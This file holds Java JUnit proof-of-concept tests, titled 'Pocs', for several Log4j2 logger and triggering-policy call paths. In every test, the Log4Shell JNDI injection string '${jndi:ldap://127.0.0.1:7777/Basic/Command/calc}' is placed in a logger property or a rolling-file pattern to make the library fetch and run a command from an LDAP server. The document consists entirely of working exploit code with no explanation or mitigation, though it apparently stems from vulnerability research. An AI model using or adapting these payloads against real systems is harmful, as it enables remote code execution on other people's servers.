## Pocs for Logger Tree ##

**AsyncLogger.actualAsyncLog()**

```
 @Test
    public void actualAsyncLogAsyncLoggerTest() throws IOException {
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        final LoggerContext ctx = new LoggerContext("TestContext");
        final Configuration config = ctx.getConfiguration();

        Appender appender = FileAppender.createAppender("target/test.log", "false", "false", "File", "true", "false", "false", "4000", layout, null, "false", null, config);
        appender.start();
        config.addAppender(appender);

        Property[] properties = new Property[]{
                Property.createProperty("keyA", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
        };


        AppenderRef ref = AppenderRef.createAppenderRef("File", null, null);
        AppenderRef[] refs = new AppenderRef[]{ref};


        LoggerConfig loggerConfig = LoggerConfig.createLogger(
                "false", // additivity
                Level.INFO, // level
                "TestLogger", // loggerName
                "true", // includeLocation
                refs, // AppenderRef array
                properties, // Property array
                config, // current Configuration
                null // Filter
        );

        loggerConfig.addAppender(appender, null, null);
        config.addLogger("TestLogger", loggerConfig);

        AsyncLogger logger = new AsyncLogger(ctx, "TestLogger", null, null);
        logger.actualAsyncLog(new RingBufferLogEvent());
    }
```

**RingBufferLogEvent.execute()**

```
 @Test
    public void executeRingBufferLogEventTest() {
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        final LoggerContext ctx = new LoggerContext("TestContext");
        final Configuration config = ctx.getConfiguration();

        Appender appender = FileAppender.createAppender("target/test.log", "false", "false", "File", "true", "false", "false", "4000", layout, null, "false", null, config);
        appender.start();
        config.addAppender(appender);

        Property[] properties = new Property[]{
                Property.createProperty("keyA", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
        };


        AppenderRef ref = AppenderRef.createAppenderRef("File", null, null);
        AppenderRef[] refs = new AppenderRef[]{ref};


        LoggerConfig loggerConfig = LoggerConfig.createLogger(
                "false", // additivity
                Level.INFO, // level
                "TestLogger", // loggerName
                "true", // includeLocation
                refs, // AppenderRef array
                properties, // Property array
                config, // current Configuration
                null // Filter
        );

        loggerConfig.addAppender(appender, null, null);
        config.addLogger("TestLogger", loggerConfig);

        AsyncLogger logger = new AsyncLogger(ctx, "TestLogger", null, null);

        StringMap data = ContextDataFactory.createContextData();

        RingBufferLogEvent bufferLogEvent = new RingBufferLogEvent();
        bufferLogEvent.setValues(logger, null, null, null, null, new MutableLogEvent(), null, data, null, 1, null, 1, null,
                new SystemMillisClock(), new SystemNanoClock());
        bufferLogEvent.execute(true);
    }
```

## Pocs for TriggeringPolicy Tree ##

**CompositeTriggeringPolicy.initialize()**

```
  @Test
    public void initializeCompositeTriggeringPolicy(){

        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
                .withFileName("app.log")
                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
                .setLayout(layout)
                .withAppend(true)
                .setName("RollingFile")
                .withPolicy(CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "false", "0 * * * * ?"))
                .withStrategy(DefaultRolloverStrategy.newBuilder()
                        .withMax(String.valueOf(3))
                        .withConfig(new DefaultConfiguration())
                        .withFileIndex("min")
                        .build())
                .build();

        TriggeringPolicy policy = CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?");
        CompositeTriggeringPolicy compositePolicy = CompositeTriggeringPolicy.createPolicy(policy);
        compositePolicy.initialize(appender.getManager());
    }
```
